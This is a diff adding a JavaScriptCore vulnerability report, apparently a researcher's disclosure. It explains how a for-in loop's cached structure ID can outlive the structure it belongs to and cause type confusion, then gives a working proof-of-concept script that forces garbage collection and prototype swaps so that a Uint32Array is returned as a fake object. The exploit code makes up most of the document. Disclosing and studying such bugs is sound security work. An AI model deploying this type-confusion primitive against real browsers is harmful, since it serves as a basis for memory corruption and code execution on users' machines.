@@ -1,0 +1,43 @@
+/*
+When a for-in loop is executed, a JSPropertyNameEnumerator object is created at the beginning and used to store the information of the input object to the for-in loop. Inside the loop, the structure ID of the "this" object of every get_by_id expression taking the loop variable as the index is compared to the cached structure ID from the JSPropertyNameEnumerator object. If it's the same, the "this" object of the get_by_id expression will be considered having the same structure as the input object to the for-in loop has.
+
+The problem is, it doesn't have anything to prevent the structure from which the cached structure ID from being freed. As structure IDs can be reused after their owners get freed, this can lead to type confusion.
+
+PoC:
+*/
+
+function gc() {
+    for (let i = 0; i < 10; i++) {
+        let ab = new ArrayBuffer(1024 * 1024 * 10);
+    }
+}
+
+function opt(obj) {
+    // Starting the optimization.
+    for (let i = 0; i < 500; i++) {
+
+    }
+
+    let tmp = {a: 1};
+
+    gc();
+    tmp.__proto__ = {};
+
+    for (let k in tmp) {  // The structure ID of "tmp" is stored in a JSPropertyNameEnumerator.
+        tmp.__proto__ = {};
+
+        gc();
+
+        obj.__proto__ = {};  // The structure ID of "obj" equals to tmp's.
+
+        return obj[k];  // Type confusion.
+    }
+}
+
+opt({});
+
+let fake_object_memory = new Uint32Array(100);
+fake_object_memory[0] = 0x1234;
+
+let fake_object = opt(fake_object_memory);
+print(fake_object);
